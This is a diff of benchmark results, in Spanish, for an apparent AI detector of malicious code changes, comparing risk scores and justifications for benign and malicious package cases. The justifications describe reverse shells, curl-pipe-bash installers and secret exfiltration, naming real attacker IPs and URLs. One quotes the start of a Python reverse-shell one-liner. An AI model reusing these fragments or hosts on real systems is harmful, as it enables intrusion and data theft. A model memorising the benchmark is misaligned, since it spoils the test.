   {
     "caso": "real_tqdm_tqdm_1773",
@@ -1207,7 +1207,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio introduce mejoras y tests para manejar iterables sin una longitud total conocida en la barra de progreso, mostrando '?' en lugar del total, lo cual es una mejora funcional esperada para una biblioteca de progre"
+    "justificacion": "El cambio adapta el comportamiento de la barra de progreso para manejar iterables sin una longitud total conocida (como generadores), mostrando un '?' en lugar del total, y añade tests unitarios que validan este nuevo co"
   },
   {
     "caso": "real_tqdm_tqdm_1775",
@@ -1218,7 +1218,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio añade funcionalidad para heredar filtros de logging en el manejador de tqdm y un test unitario que lo verifica, sin introducir código malicioso, llamadas de red, ofuscación o cambios en las dependencias."
+    "justificacion": "El cambio introduce un nuevo test para verificar la herencia de filtros de log en `tqdm` y la implementación correspondiente en el código para asegurar que los filtros se copian al handler de `tqdm`, lo que es una mejora"
   },
   {
     "caso": "real_tqdm_tqdm_1776",
@@ -1229,7 +1229,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio añade la funcionalidad `return_exceptions` al método `gather` de `tqdm.asyncio`, con un nuevo bloque `try...except` para capturar y devolver las excepciones, y se incluye un test unitario nuevo que valida este "
+    "justificacion": "El cambio añade la funcionalidad `return_exceptions` al wrapper de `asyncio.gather`, un comportamiento esperado y bien probado en el fichero de tests, sin añadir llamadas de red, ofuscación ni cambios en la seguridad."
   },
   {
     "caso": "real_tqdm_tqdm_1777",
@@ -1240,7 +1240,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio introduce soporte para concurrent.futures.InterpreterPoolExecutor (Python 3.14+) mediante un nuevo _InterpreterLock basado en colas entre intérpretes, con tests unitarios que confirman su correcto funcionamient"
+    "justificacion": "El cambio introduce soporte para concurrent.futures.InterpreterPoolExecutor (Python 3.14+) con un mecanismo de bloqueo entre intérpretes bien definido, usando componentes de la librería estándar y tests que cubren la nue"
   },
   {
     "caso": "real_tqdm_tqdm_1778",
@@ -1251,7 +1251,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios introducen comprobaciones defensivas (`getattr` y `hasattr`) para manejar la posible ausencia de atributos (`disable`, `last_print_t`) al cerrar la barra de progreso, lo cual mejora la robustez del código."
+    "justificacion": "Los cambios modifican la lógica interna del cierre de la barra de progreso, manejando la posible ausencia de los atributos 'disable' y 'last_print_t'. Esto parece ser una corrección o un robustecimiento del código para e"
   },
   {
     "caso": "real_tqdm_tqdm_1780",
@@ -1262,7 +1262,7 @@
     "score": 1,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una corrección gramatical en tres archivos de documentación y un archivo Jupyter Notebook, sin introducir código nuevo, modificar dependencias ni alterar la lógica del programa."
+    "justificacion": "Los cambios se limitan a la eliminación de un fichero .gitkeep y correcciones gramaticales ('can be also used' a 'can also be used') en ficheros de documentación (.rst y .ipynb), sin afectar la lógica del programa, depen"
   },
   {
     "caso": "real_tqdm_tqdm_1781",
@@ -1273,7 +1273,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio introduce lógica para manejar valores 'infinitos' en el parámetro 'total' de una barra de progreso, con una corrección de comportamiento en `tqdm/std.py` y un test unitario que lo verifica en `tests/tests_tqdm."
+    "justificacion": "El cambio introduce un manejo explícito para valores 'infinito' en el parámetro 'total' de la barra de progreso, y añade un test unitario para verificar este comportamiento. Esto mejora la robustez del componente y no ti"
   },
   {
     "caso": "real_tqdm_tqdm_1783",
@@ -1284,18 +1284,18 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en refactorizar y añadir tests para la función `reset()` de `tqdm`, incluyendo el manejo de `total=float('inf')` como un total desconocido, y ajustar la inicialización de `self.total` en `tqdm/std.py` "
+    "justificacion": "El cambio adapta el manejo de 'total=float(\"inf\")' para que se trate consistentemente como un total desconocido (None) en la barra de progreso, y actualiza los tests para reflejar este comportamiento usando capsys, que e"
   },
   {
     "caso": "real_urllib3_urllib3_5103",
     "clase": "benign",
     "dificultad": "medium",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (4)",
-    "score": 4,
+    "obtenido": "amarillo (44)",
+    "score": 44,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios se distribuyen entre un fichero de changelog, un fichero de código Python y un fichero de lock de dependencias. El análisis estático no detectó patrones sospechosos en ninguna de las adiciones, y los tipos de"
+    "justificacion": "El diff proporcionado no incluye el contenido de los ficheros modificados, impidiendo cualquier evaluación de intencionalidad maliciosa en el código real. [Ajustado a 60: hay contenido del diff que no se pudo revisar (tr"
   },
   {
     "caso": "real_urllib3_urllib3_5120",
@@ -1306,7 +1306,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a una aclaración de la documentación sobre el uso de RETRY_AFTER_STATUS_CODES en un comentario, sin afectar ninguna línea de código ejecutable, dependencias o scripts de build."
+    "justificacion": "El cambio consiste únicamente en una actualización de un comentario de documentación en una línea existente, sin afectar ninguna lógica ejecutable, dependencias o configuración de build."
   },
   {
     "caso": "real_urllib3_urllib3_5140",
@@ -1317,7 +1317,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio añade un diccionario 'extra' a la llamada a `log.warning` con el host, una característica estándar del módulo `logging` de Python para añadir contexto a los logs, y está explicado por comentarios que referencia"
+    "justificacion": "El cambio añade un diccionario 'extra' a una llamada de logging de warning existente, que incluye el host de la conexión para mejorar la reescritura de logs por parte de otras herramientas como pip, sin introducir ejecuc"
   },
   {
     "caso": "atomic_arch_simulado",
@@ -1328,18 +1328,18 @@
     "score": 96,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "Se añade una función post_install() al PKGBUILD que descarga y ejecuta un script externo (curl ... | bash) de un dominio no verificado durante la instalación del paquete, sin relación con el cambio de versión aparente."
+    "justificacion": "La función post_install() añade una descarga y ejecución de código arbitrario desde un dominio externo (curl ... | bash), un patrón conocido de ataque en PKGBUILDs, sin relación con un simple cambio de versión del paquet"
   },
   {
     "caso": "benign_new_feature_with_new_dep",
     "clase": "canonico",
     "dificultad": "-",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "amarillo (62)",
-    "score": 62,
+    "obtenido": "amarillo (51)",
+    "score": 51,
     "cumple": "OK",
-    "categoria": "backdoor",
-    "justificacion": "La adición de la dependencia `click==8.1.7` en `requirements.txt` introduce una vulnerabilidad conocida (PYSEC-2026-2132), que podría ser explotada para comprometer el sistema."
+    "categoria": "ninguna",
+    "justificacion": "El PR introduce la dependencia 'click==8.1.7' en 'requirements.txt' y la utiliza en 'app/cli.py', la cual presenta una vulnerabilidad conocida (PYSEC-2026-2132)."
   },
   {
     "caso": "benign_refactor",
@@ -1350,29 +1350,29 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio es un renombrado puramente cosmético de una función existente, sin nueva lógica, llamadas de red ni cambios de dependencias."
+    "justificacion": "El cambio es un renombrado puramente cosmético de la función 'calculate_total' a 'compute_total' en el módulo de billing y sus tests asociados, sin nueva lógica, llamadas de red ni cambios de dependencias."
   },
   {
     "caso": "cve_known_vulnerable_dependency",
     "clase": "canonico",
     "dificultad": "-",
     "esperado": "amarillo/rojo (min. 35)",
-    "obtenido": "amarillo (58)",
-    "score": 58,
+    "obtenido": "amarillo (51)",
+    "score": 51,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "Se añade una dependencia nueva, PyYAML==5.1, que tiene vulnerabilidades conocidas de ejecución remota de código (RCE) por deserialización insegura (GHSA-3pqx-4fqf-j49f, GHSA-8q59-q68h-6hv4)."
+    "justificacion": "La adición de PyYAML==5.1 introduce dependencias con vulnerabilidades conocidas (GHSA-3pqx-4fqf-j49f, GHSA-6757-jp84-gxfx, GHSA-8q59-q68h-6hv4) que podrían ser explotadas para ejecución de código arbitrario."
   },
   {
     "caso": "false_positive_candidate",
     "clase": "canonico",
     "dificultad": "-",
     "esperado": "amarillo (min. 20)",
-    "obtenido": "amarillo (65)",
-    "score": 65,
-    "cumple": "OK",
-    "categoria": "backdoor",
-    "justificacion": "La nueva función `evaluate_formula` utiliza `eval()` sobre una expresión (`expr`) que se describe como 'formula de usuario', permitiendo la ejecución de código arbitrario controlado por el atacante, a pesar de los intent"
+    "obtenido": "verde (7)",
+    "score": 7,
+    "cumple": "DIVERGE",
+    "categoria": "ninguna",
+    "justificacion": "Se añade una función 'evaluate_formula' que usa 'eval' para evaluar expresiones de usuario, pero con fuertes medidas de seguridad: '__builtins__' se establece a un diccionario vacío y el 'namespace' se limita estrictamen"
   },
   {
     "caso": "malicious_curl_pipe_bash_in_dockerfile",
@@ -1383,7 +1383,7 @@
     "score": 86,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El ENTRYPOINT modificado descarga y ejecuta un script remoto desde 'http://pkg-mirror.example/boot.sh' antes de iniciar la aplicación, un patrón claro para introducir código arbitrario en el contenedor."
+    "justificacion": "El ENTRYPOINT del Dockerfile ha sido modificado para descargar y ejecutar un script desde una URL externa (http://pkg-mirror.example/boot.sh) en el momento de arranque del contenedor, antes de iniciar la aplicación princ"
   },
   {
     "caso": "malicious_eval_base64",
@@ -1394,29 +1394,29 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "Se añade una función `_init_cache()` que importa base64, y luego decodifica y ejecuta una cadena base64. El código decodificado (`import os,socket,subprocess;s=socket.socket();s.connect((\"198.51.100.24\",4444));[os.dup2(s"
+    "justificacion": "El cambio introduce una función '_init_cache()' que decodifica y ejecuta una reverse shell en Python, conectándose a '198.51.100.24:4444' y ejecutando '/bin/sh -i', un patrón claro de backdoor para ejecución remota de co"
   },
   {
     "caso": "prt_scan_simulado",
     "clase": "canonico",
     "dificultad": "-",
     "esperado": "rojo (min. 66)",
-    "obtenido": "rojo (86)",
-    "score": 86,
+    "obtenido": "rojo (90)",
+    "score": 90,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "Se ha añadido un nuevo paso al workflow de CI/CD que exfiltra los secretos 'DEPLOY_KEY' y 'NPM_TOKEN' a un dominio externo (telemetry-collect.example) mediante una llamada 'curl -X POST'."
+    "justificacion": "El workflow de CI/CD añade un paso que exfiltra los secretos DEPLOY_KEY y NPM_TOKEN a una URL externa ('https://telemetry-collect.example/report') sin relación aparente con el resto del pipeline, bajo la etiqueta de 'Deb"
   },
   {
     "caso": "real_click_deprecate_isolated_fs",
     "clase": "canonico",
     "dificultad": "-",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (0)",
-    "score": 0,
+    "obtenido": "amarillo (44)",
+    "score": 44,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El diff no contiene cambios de código, dependencias o configuración significativos; todas las entradas indican 0 líneas adicionales sin patrones detectados por análisis estático."
+    "justificacion": "No se proporcionó ningún contenido de diff para analizar. Todos los ficheros indicados en el diff tenían el contenido no verificado o no incluido por tamaño, por lo que no se pueden evaluar cambios reales. [Ajustado a 60"
   },
   {
     "caso": "real_click_gha_update",
@@ -1427,7 +1427,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a actualizaciones rutinarias de versiones de GitHub Actions, todas ellas pinneadas a un SHA de commit específico (no a tags mutables) sin añadir pasos nuevos, modificar permisos o exfiltrar secretos."
+    "justificacion": "Las modificaciones actualizan rutinariamente varias acciones de GitHub a sus versiones más recientes, pinneadas por SHA de commit, sin introducir nuevos pasos maliciosos, comandos de ejecución o cambios en el manejo de s"
   },
   {
     "caso": "real_click_help_param_parsing",
@@ -1438,7 +1438,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio introduce un nombre de almacenamiento interno reservado para la opción de ayuda (`_click_default_help`) y añade advertencias para evitar colisiones de nombres de parámetros que de otra forma sobrescribirían val"
+    "justificacion": "El cambio renombra el nombre interno de almacenamiento para la opción de ayuda automática a un nombre reservado para evitar conflictos con parámetros definidos por el usuario, y añade advertencias para nombres de parámet"
   },
   {
     "caso": "real_click_package_name_resolution",
@@ -1449,40 +1449,40 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio en `src/click/decorators.py` mejora la resolución de nombres de paquetes a nombres de distribución usando `importlib.metadata.packages_distributions` cuando no coinciden directamente, un cambio funcional legíti"
+    "justificacion": "El cambio mejora la lógica de resolución de nombres de paquetes en 'version_option' utilizando APIs estándar de Python (importlib.metadata), manejando casos de nombres de módulo diferentes al nombre de la distribución, y"
   },
   {
     "caso": "real_jinja_py313_test_fix",
     "clase": "canonico",
     "dificultad": "-",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (4)",
-    "score": 4,
+    "obtenido": "verde (7)",
+    "score": 7,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio adapta el acceso a los archivos internos de zipimporter para compatibilidad con Python 3.13+ (PEP 704), sin introducir código externo, descargas o cambios de comportamiento no justificados, y los tests se actua"
+    "justificacion": "El cambio adapta el acceso a metadatos de zipimporter para compatibilidad con Python 3.13+ y PyPy, lo cual es una corrección legítima para un loader de plantillas. El `.pyc` añadido es un artefacto de build que debería e"
   },
   {
     "caso": "real_jinja_trio_test_support",
     "clase": "canonico",
     "dificultad": "-",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (4)",
-    "score": 4,
+    "obtenido": "amarillo (51)",
+    "score": 51,
     "cumple": "OK",
-    "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la implementación de un manejo más robusto de generadores asíncronos y sus recursos, incluyendo la adición de cierres explícitos (aclose) en bloques try/finally, mejoras en auto_aiter, y la actualiz"
+    "categoria": "backdoor",
+    "justificacion": "La actualización de la dependencia `idna` a la versión 3.6 introduce una vulnerabilidad conocida de denegación de servicio (CVE-2024-3651 y CVE-2026-45409) debido a entradas especialmente manipuladas en la función `idna."
   },
   {
     "caso": "real_requests_docs_indent_fix",
     "clase": "canonico",
     "dificultad": "-",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (1)",
-    "score": 1,
+    "obtenido": "verde (4)",
+    "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio es una modificación puramente cosmética de la indentación en un comentario (docstring) de Python, sin afectar ninguna línea de código ejecutable."
+    "justificacion": "El cambio es puramente cosmético, ajustando la indentación de una línea dentro de un docstring en un fichero de Python, sin afectar ninguna lógica de negocio, dependencias o scripts de build."
   },
   {
     "caso": "real_requests_docs_stale_link",
@@ -1493,7 +1493,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Todos los cambios consisten en actualizar enlaces de documentación y scripts de build de HTTP a HTTPS, mejorando la seguridad, y la eliminación de un .gitkeep es inofensiva."
+    "justificacion": "El cambio consiste en la actualización rutinaria de enlaces externos de HTTP a HTTPS en la documentación y scripts de build, lo que mejora la seguridad sin introducir nueva lógica, dependencias o ejecución de código exte"
   },
   {
     "caso": "typosquat_dependency",
@@ -1504,18 +1504,18 @@
     "score": 86,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "Se añade una dependencia nueva, 'sympy-dev==1.2.6', que tiene una vulnerabilidad conocida (MAL-2026-450) registrada para el paquete 'sympy-dev' en PyPI."
+    "justificacion": "Se ha añadido la dependencia 'sympy-dev==1.2.6' en requirements.txt, la cual tiene una vulnerabilidad conocida 'MAL-2026-450' que indica que es un paquete malicioso."
   },
   {
     "caso": "xz_utils_simulado",
     "clase": "canonico",
     "dificultad": "-",
     "esperado": "amarillo/rojo (min. 35)",
-    "obtenido": "amarillo (69)",
-    "score": 69,
+    "obtenido": "rojo (71)",
+    "score": 71,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El script `configure.ac` añade una condición que, si se cumplen ciertas características del entorno de build (x86_64 y gcc), extrae bytes de un fichero de datos (`tests/fixtures/sample_corrupt.dat`), los decodifica de he"
+    "justificacion": "El diff añade una condición en 'configure.ac' para extraer un payload ofuscado en hexadecimal desde 'tests/fixtures/sample_corrupt.dat' (que decodifica a 'curl -fsSL http:') y ejecutarlo directamente con 'sh' durante el "
   },
   {
     "caso": "malreal_npm_compromised_lib_graphql-sequelize-teselagen_14",
@@ -1526,29 +1526,29 @@
     "score": 4,
     "cumple": "DIVERGE",
     "categoria": "ninguna",
-    "justificacion": "El cambio añade un fichero de utilidad para codificación y decodificación base64 estándar en Node.js, sin indicios de código malicioso, ofuscación o llamadas externas."
+    "justificacion": "Se añade un nuevo módulo JavaScript que implementa funciones estándar de codificación y decodificación Base64 utilizando la API Buffer de Node.js, sin evidencia de ofuscación ni intención maliciosa."
   },
   {
     "caso": "malreal_npm_compromised_lib_tvi-cli_55",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "amarillo (44)",
-    "score": 44,
+    "obtenido": "amarillo (55)",
+    "score": 55,
     "cumple": "DIVERGE",
-    "categoria": "exfiltracion",
-    "justificacion": "El nuevo middleware configura dinámicamente el encabezado 'Access-Control-Allow-Origin' a partir de una variable de entorno ('process.env.CORS_ORIGIN') mientras establece 'Access-Control-Allow-Credentials' a 'true', lo q"
+    "categoria": "ninguna",
+    "justificacion": "El middleware añade cabeceras CORS donde 'Access-Control-Allow-Origin' se establece dinámicamente desde una variable de entorno ('process.env.CORS_ORIGIN'), y 'Access-Control-Allow-Credentials' se fija a 'true'. Esta com"
   },
   {
     "caso": "malreal_npm_malicious_intent_apple-mycelium-fix_5",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "rojo (90)",
-    "score": 90,
+    "obtenido": "rojo (92)",
+    "score": 92,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El código nuevo ejecuta comandos del sistema (`ipconfig`, `arp`, `netstat`, `whoami`) para recolectar información de la red y del usuario, y luego exfiltra esos datos a una URL externa (`https://webhook.site/...`) a trav"
+    "justificacion": "El nuevo fichero index.js ejecuta comandos de reconocimiento del sistema ('ipconfig /all', 'arp -a', 'netstat -n', 'whoami /all' / 'id') y exfiltra la salida junto con variables de entorno a una URL externa ('https://web"
   },
   {
     "caso": "malreal_npm_malicious_intent_elf-stats-candystriped-garland-735_16",
@@ -1559,7 +1559,7 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El fichero index.js, recién añadido, ejecuta un comando de shell (línea 5) que lee el contenido de todos los ficheros en /opt/, lo codifica en base64 y lo exfiltra vía POST a un endpoint de webhook.site, que es un servic"
+    "justificacion": "El nuevo fichero 'index.js' ejecuta un comando de shell que lee todos los ficheros de '/opt/', codifica su contenido en base64 y los exfiltra a una URL externa (webhook.site) a través de curl, un patrón claro de robo de "
   },
   {
     "caso": "malreal_npm_malicious_intent_evocataur_24",
@@ -1570,18 +1570,18 @@
     "score": 90,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El fichero nuevo recopila direcciones MAC, nombre de usuario, directorio home y hostname del sistema, y los envía vía HTTP GET a varios dominios externos sospechosos ('oast.fun', 'byted-dast.com') sin justificación apare"
+    "justificacion": "El fichero nuevo index.js recolecta direcciones MAC, nombre de usuario, hostname y directorio home, y envía toda esta información codificada por URL a dominios externos hardcodeados a través de peticiones HTTP GET."
   },
   {
     "caso": "malreal_npm_malicious_intent_formio-tenant_27",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "rojo (92)",
-    "score": 92,
+    "obtenido": "rojo (90)",
+    "score": 90,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El nuevo fichero 'preinstall.js' ejecuta comandos específicos de la plataforma (PowerShell o curl) para recolectar información del sistema (usuario, SO, versión del kernel) y enviarla a una IP y puerto hardcodeados (http"
+    "justificacion": "El script 'preinstall.js' detecta el sistema operativo y, durante la fase de preinstalación, exfiltra información del sistema (usuario, OS, versión del kernel) a una dirección IP externa (206.189.139.175:8080) usando Pow"
   },
   {
     "caso": "malreal_npm_malicious_intent_kubehook_19",
@@ -1592,18 +1592,18 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El fichero 'index.js' añadido ejecuta un comando curl que exfiltra el contenido de '/etc/passwd', '/etc/hosts', la salida de 'id' y el posible contenido de '/etc/shadow' (codificado en base64) a una IP externa (195.179.2"
+    "justificacion": "El fichero nuevo ejecuta un comando 'curl' para exfiltrar información sensible del sistema (whoami, hostname, /etc/passwd, /etc/hosts, id, /etc/shadow) codificada en base64 a una IP externa (195.179.231.72:80)."
   },
   {
     "caso": "malreal_npm_malicious_intent_language-common_31",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "rojo (90)",
-    "score": 90,
+    "obtenido": "rojo (86)",
+    "score": 86,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El código nuevo en index.js recopila información detallada del sistema (directorio, usuario, hostname, DNS, datos de package.json) y la envía a un dominio externo (oastify.com) a través de una petición HTTPS POST, con un"
+    "justificacion": "El nuevo fichero index.js recopila información sensible del sistema (directorio home, nombre de host, nombre de usuario, servidores DNS) y del paquete (package.json) para enviarla a un dominio externo sospechoso (oastify"
   },
   {
     "caso": "malreal_npm_malicious_intent_money-badger-open-rpc_2",
@@ -1614,40 +1614,40 @@
     "score": 90,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El fichero nuevo ejecuta un comando de shell que recolecta información del sistema (hostname, pwd, whoami, IP externa) y la exfiltra a través de consultas DNS (nslookup) a un dominio externo (oastify.com), un patrón clar"
+    "justificacion": "El nuevo fichero `index.js` ejecuta un comando de shell que recolecta información del sistema (hostname, pwd, whoami, IP externa) y la exfiltra codificada en hexadecimal a través de consultas DNS a un dominio externo (oa"
   },
   {
     "caso": "malreal_npm_malicious_intent_node-denv_13",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "rojo (91)",
-    "score": 91,
+    "obtenido": "rojo (92)",
+    "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El fichero nuevo descarga código arbitrario desde una URL remota ('https://jsonkeeper.com/b/EXSIF') y lo ejecuta inmediatamente con 'new Function.constructor(\"require\", s); handler(require)', otorgando control total sobr"
+    "justificacion": "El fichero 'caller.js' descarga código arbitrario de un dominio externo (https://jsonkeeper.com/b/EXSIF) y lo ejecuta inmediatamente en tiempo real usando 'new Function.constructor(\"require\", s)', lo que constituye una b"
   },
   {
     "caso": "malreal_npm_malicious_intent_rank4222wun_25",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "rojo (90)",
-    "score": 90,
+    "obtenido": "rojo (92)",
+    "score": 92,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El nuevo fichero `preinstall.js` recopila información sensible del sistema (variables de entorno, privilegios de usuario, listados de directorios, configuración de red, líneas del archivo `/etc/passwd`, información del k"
+    "justificacion": "El nuevo fichero 'preinstall.js' ejecuta comandos del sistema (`set`, `whoami /priv`, `ipconfig /all`, `cat /etc/passwd`, `uname -a`) para recolectar información sensible del sistema y del usuario, y luego la exfiltra a "
   },
   {
     "caso": "malreal_pypi_compromised_lib_durabletask_0",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "rojo (72)",
-    "score": 72,
+    "obtenido": "rojo (71)",
+    "score": 71,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El fichero `__init__.py` añadido descarga y ejecuta un fichero python externo (`rope.pyz`) desde un dominio de terceros (`https://check.git-service.com/rope.pyz`) en sistemas Linux, redirigiendo su salida y errores a `/d"
+    "justificacion": "El código descarga y ejecuta un paquete Python (.pyz) externo desde 'https://check.git-service.com/rope.pyz' en sistemas Linux, iniciando un nuevo proceso oculto (redirección de I/O a /dev/null) y silenciando cualquier e"
   },
   {
     "caso": "malreal_pypi_compromised_lib_mflux-streamlit_6",
@@ -1658,18 +1658,18 @@
     "score": 4,
     "cumple": "DIVERGE",
     "categoria": "ninguna",
-    "justificacion": "El cambio introduce un nuevo script `main.py` que simplemente lanza una aplicación Streamlit local (`app.py`) usando `subprocess.run`, sin llamadas externas, nuevas dependencias ni cambios en la configuración de build."
+    "justificacion": "El nuevo fichero `main.py` es un simple wrapper para ejecutar una aplicación Streamlit local (`app.py`) usando `subprocess.run()`, sin llamadas de red, ejecución de código externo, exfiltración de datos o cambios en depe"
   },
   {
     "caso": "malreal_pypi_malicious_intent_controlnot-aux_12",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "rojo (86)",
-    "score": 86,
+    "obtenido": "rojo (90)",
+    "score": 90,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El script recolecta hostname, nombre de usuario, ruta actual y direcciones MAC, las codifica en Base64, y las exfiltra a URLs externas sospechosas (incluyendo dominios OAST) utilizando urllib.request.urlopen en un bucle."
+    "justificacion": "El nuevo fichero `main.py` recopila información del sistema (nombre de host, usuario, directorio actual y direcciones MAC codificadas en base64) y la envía a múltiples dominios externos sospechosos (p. ej., 'sbfwstspuuti"
   },
   {
     "caso": "malreal_pypi_malicious_intent_easygetflag_17",
@@ -1680,7 +1680,7 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El fichero setup.py define una clase PostInstallCommand que, al instalarse el paquete, ejecuta una reverse shell a 49.233.121.53:54, redirigiendo stdin/stdout/stderr a un socket y ejecutando /bin/sh -i, lo que es una pue"
+    "justificacion": "El nuevo fichero `setup.py` define una clase `PostInstallCommand` que ejecuta una función `reverse_shell` durante la instalación del paquete. Esta función establece una conexión de socket a una IP y puerto codificados en"
   },
   {
     "caso": "malreal_pypi_malicious_intent_fjkslfjsdgbjkbnjfdkq_13",
@@ -1691,18 +1691,18 @@
     "score": 86,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El fichero nuevo importa la librería 'requests' para descargar un archivo .tar.gz de un conocido minero de criptomonedas (xmrig) desde GitHub, y luego intenta procesarlo como JSON, lo que indica un intento de introducir "
+    "justificacion": "El fichero '__init__.py' añadido descarga directamente un binario de XMRig (un conocido cryptominer) desde GitHub Releases, lo cual es un patrón de backdoor para instalar software no deseado."
   },
   {
     "caso": "malreal_pypi_malicious_intent_keras-beautifulsoup_15",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "rojo (92)",
-    "score": 92,
+    "obtenido": "rojo (90)",
+    "score": 90,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El archivo setup.py añade un nuevo paquete que, al ser importado o instalado, intenta descargar un archivo ejecutable (Windows.exe) de un CDN de Discord y ejecutarlo a través de un código base64 descodificado con exec(),"
+    "justificacion": "El fichero `setup.py` ejecuta código base64 codificado que intenta descargar un ejecutable (`Windows.exe`) desde una URL de Discord (`https://cdn.discordapp.com/accounts/.../Windows.exe`) y luego ejecutarlo, lo cual es u"
   },
   {
     "caso": "malreal_pypi_malicious_intent_mjrl_11",
@@ -1713,7 +1713,7 @@
     "score": 90,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El script `setup.py` añadido define una clase `CustomInstall` que, al ejecutarse durante la instalación del paquete, recolecta el hostname, directorio actual y nombre de usuario, enviándolos a una URL externa ('https://6"
+    "justificacion": "El script setup.py, que se ejecuta en la instalación del paquete, sobrescribe el comando 'install' para recolectar el hostname, directorio de trabajo actual y nombre de usuario del sistema, enviándolos vía HTTP GET a un "
   },
   {
     "caso": "malreal_pypi_malicious_intent_nsscache_3",
@@ -1724,7 +1724,7 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El script setup.py, que se ejecuta durante la instalación del paquete, recolecta el nombre de host, usuario y dirección IP pública del sistema y los envía a una IP externa hardcodeada (69.164.221.216:8080/callback) en un"
+    "justificacion": "El fichero setup.py ejecuta código que recolecta el hostname, el usuario y la IP pública del sistema, para luego enviarlos en formato JSON a una dirección IP externa codificada (http://69.164.221.216:8080/callback) inmed"
   },
   {
     "caso": "malreal_pypi_malicious_intent_qakepip_2",
@@ -1735,106 +1735,106 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El fichero setup.py añade una clase 'CustomInstall' que ejecuta una reverse shell codificada en base64 ('os.system('echo %s|base64 -d|bash' % encoded)') en el hook de instalación del paquete, con LHOST y LPORT harcodeado"
+    "justificacion": "El fichero setup.py añadido define una clase CustomInstall que, al ejecutar su método run, construye una reverse shell en Python, la codifica en base64 y la ejecuta vía os.system, conectándose a e6j4342057.zicp.fun:26264"
   },
   {
     "caso": "malreal_pypi_malicious_intent_textmesh_14",
     "clase": "malicious",
     "dificultad": "easy",
     "esperado": "rojo (min. 70)",
-    "obtenido": "rojo (86)",
-    "score": 86,
+    "obtenido": "rojo (90)",
+    "score": 90,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El script nuevo recopila el nombre de host, nombre de usuario, directorio actual y direcciones MAC, codifica las direcciones MAC en base64 y las envía como parámetros de consulta a una lista de URLs externas sospechosas "
